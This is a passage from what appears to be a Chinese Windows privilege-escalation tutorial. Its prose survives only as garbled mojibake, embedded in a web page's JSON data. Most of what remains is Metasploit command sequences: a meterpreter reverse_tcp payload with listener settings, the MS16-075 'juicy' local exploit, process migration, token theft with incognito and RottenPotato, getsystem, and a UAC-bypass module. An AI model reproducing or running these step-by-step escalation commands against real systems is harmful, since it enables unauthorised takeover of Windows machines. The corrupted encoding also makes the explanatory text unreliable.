ad windows\/meterpreter\/reverse_tcp\nset lhost 0.0.0.0\nset lport 6666\nrun\n```\nзӣҙжҺҘеҲ©з”Ёж—¶еҸҚеј№ж–°з«ҜеҸЈпјҡ\nuse exploit\/windows\/local\/ms16_075_reflection_juicy  дҪҝз”ЁиҝҷдёӘcveжҸҗжқғеҲ©з”Ё\nshow options\nи®ҫзҪ®зӣ‘еҗ¬жңәе’Ңз«ҜеҸЈ666\nexploit  зӣҙжҺҘеҲ©з”ЁдёҠзәҝеҲ°ж–°зӣ‘еҗ¬жңәе’Ңз«ҜеҸЈгҖӮ\nжӯӨж—¶еӣһеҲ°зӣ‘еҗ¬зҡ„йЎөйқўеҚіеҸҜзңӢеҲ°дёҠзәҝ\ngetuidжҸҗжқғжҲҗеҠҹ\n\n\n# **жң¬ең°з”ЁжҲ·жҸҗжқғ**\n## **Winзҡ„MSFдјҡиҜқдёӯиҝӣзЁӢиҝҒз§»жҸҗжқғ**\nиҝӣе…ҘдјҡиҜқ\npsжҹҘзңӢиҝӣзЁӢпјҢе“ӘдәӣиҝӣзЁӢжҳҜsystemиҝҗиЎҢгҖӮ\nmigrate 288иҝӣзЁӢеҸ· пјҢеҚіеҸҜ\ngetuid дёәsystemдәҶ\n\n## **Winзҡ„MSFдјҡиҜқд»ӨзүҢзӘғеҸ–жҸҗжқғ**\nmsfдјҡиҜқдёӯ\n```\nuse incognito\nlist_tokens -u           #еҲ—еҮәжңүзҡ„д»ӨзүҢ,е…¶дёӯNT TAUTHORITY\\SYSTEMдёәжҲ‘д»¬йңҖиҰҒзҡ„\nimpersonate_token \"NT AUTHORITY\\SYSTEM\" #зӘғеҸ–systemд»ӨзүҢ\ngetuid еҚіеҸҜжҳҜsystem\n```\n\n## **MSFй…ҚеҗҲзғӮеңҹиұҶе®һзҺ°д»ӨзүҢзӘғеҸ–**\nзғӮеңҹиұҶ(RottenPotatoпјүMS16-075жҸҗжқғжҳҜдёҖдёӘжң¬ең°жҸҗжқғпјҢдёҖиҲ¬еҸӘй’ҲеҜ№жң¬ең°з”ЁжҲ·пјҢдёҚж”ҜжҢҒеҹҹз”ЁжҲ·пјҢиҝҷйҮҢжӣҙеӨҡжҳҜж”ҜжҢҒwebжңҚеҠЎз”ЁжҲ·гҖӮ\n\nеҺҹзҗҶпјҡ\nзғӮеңҹиұҶдёҖдёӘжәўеҮәжјҸжҙһеҠҹиғҪжҳҜеҸҜд»Ҙж¬әйӘ—вҖңNT AUTHORITY\\SYSTEMвҖқиҙҰжҲ·йҖҡиҝҮNTLMи®ӨиҜҒеҲ°жҲ‘д»¬жҺ§еҲ¶зҡ„TCPз»Ҳз«ҜпјҢеҜ№иҝҷдёӘи®ӨиҜҒиҝҮзЁӢдҪҝз”Ёдёӯй—ҙдәәж”»еҮ»пјҲNTLMйҮҚж”ҫпјүпјҢдёәвҖңNTAUTHORITYSYSTEMвҖқиҙҰжҲ·жң¬ең°еҚҸе•ҶдёҖдёӘе®үе…Ёд»ӨзүҢгҖӮиҝҷдёӘиҝҮзЁӢжҳҜйҖҡиҝҮдёҖзі»еҲ—зҡ„WindowsAPIи°ғз”Ёе®һзҺ°зҡ„пјҢжЁЎд»ҝиҝҷдёӘд»ӨзүҢгҖӮ\n\nжқЎд»¶пјҡ\nеҸӘжңүе…·жңүвҖңжЁЎд»ҝе®үе…Ёд»ӨзүҢжқғйҷҗвҖқзҡ„иҙҰжҲ·жүҚиғҪеҺ»жЁЎд»ҝеҲ«дәәзҡ„д»ӨзүҢгҖӮдёҖиҲ¬еӨ§еӨҡж•°зҡ„жңҚеҠЎеһӢиҙҰжҲ·пјҲIISгҖҒMSSQLзӯүпјүжңүиҝҷдёӘжқғйҷҗпјҢеӨ§еӨҡж•°з”ЁжҲ·зә§зҡ„иҙҰжҲ·жІЎжңүиҝҷдёӘжқғйҷҗгҖӮ\n\nйҖӮз”ЁзүҲжң¬пјҡ\nWindows7\/8\/10пјҢWindowsserver2008\/2012\n\n\nеҲ©з”Ёпјҡ\n<https:\/\/github.com\/SecWiki\/windows-kernel-exploits\/tree\/master\/MS16-075>    \nе°ҶзғӮеңҹиұҶе·Ҙе…·з»ҷдёҠдј иҮійңҖиҰҒжҸҗжқғзҡ„жңәеҷЁдёӯпјҢpotato.exe\nmsfдјҡиҜқдёӯжү§иЎҢ\n```\nexecute -cH -f .\/potato.exe    ##жү§иЎҢзғӮеңҹиұҶзЁӢеәҸ\nuse incognito                  ##еҠ иҪҪзӘғеҸ–еҠҹиғҪ\nlist_tokens -u                 ##жҹҘзңӢеҸҜзӘғеҸ–зҡ„д»ӨзүҢ\nimpersonate_token \"NT AUTHORITY\\SYSTEM\"   ##дҪҝз”Ёд»ӨзүҢ\ngetuid\n``` \n\n## **Winзҡ„MSFдјҡиҜқиҮӘеҠЁжҸҗжқғ**\nmsfдјҡиҜқдёӯ\n```\ngetsystem \/\/иҮӘеҠЁеҜ»жүҫmsfдёӯжҸҗжқғпјҢд»…ж”ҜжҢҒwindows\ngetuid\n```\nwin10+жңүUACдҝқжҠӨж—¶пјҢеҸҜиғҪдёҚжҲҗеҠҹгҖӮ\n\nжӯӨж—¶еҸҜд»ҘжҗңзҙўbypassUACжЁЎеқ—дҪҝз”ЁгҖӮ\n>дҪҝз”ЁеүҚжҸҗжңүдёӨдёӘпјҡ\n>дёҖжҳҜзі»з»ҹеҪ“еүҚз”ЁжҲ·еҝ…йЎ»еңЁз®ЎзҗҶе‘ҳз»„дёӯ\n>дәҢжҳҜз”ЁжҲ·иҙҰжҲ·жҺ§еҲ¶зЁӢеәҸUACи®ҫзҪ®дёәй»ҳи®ӨпјҢеҚівҖңд»…еңЁзЁӢеәҸиҜ•еӣҫжӣҙж”№жҲ‘зҡ„и®Ўз®—жңәж—¶йҖҡзҹҘжҲ‘\n```\nsearch uac жҹҘзңӢеҜ№еә”зі»з»ҹзүҲжң¬зҡ„\nuse exploit\/windows\/local\/ask    ##йҖүжӢ©жЁЎеқ—\nsessions         ##жҹҘзңӢеҗҺеҸ°дјҡиҜқ\nset session 1    ##йҖүжӢ©еә”з”Ёзҡ„дјҡиҜқID\nset lport 5555   ##и®ҫзҪ®зӣ‘еҗ¬з«ҜеҸЈпјҢжңүж—¶еҖҷиҝ”еӣһеӣһжқҘдјҡеҮәзҺ°й”ҷиҜҜпјҢжүҖд»Ҙе°ұеҸҰиө·дёҖдёӘзӣ‘еҗ¬гҖӮ\n```","meta":{"ctime":"2024-09-08T02:12:19+08:00","mtime":"2024-09-08T02:12:19+08:00"}},"options":{"poweredBy":{"name":"йЎ¶жғідә‘","link":"https:\/\/www.topthink.com"}}}
</script>
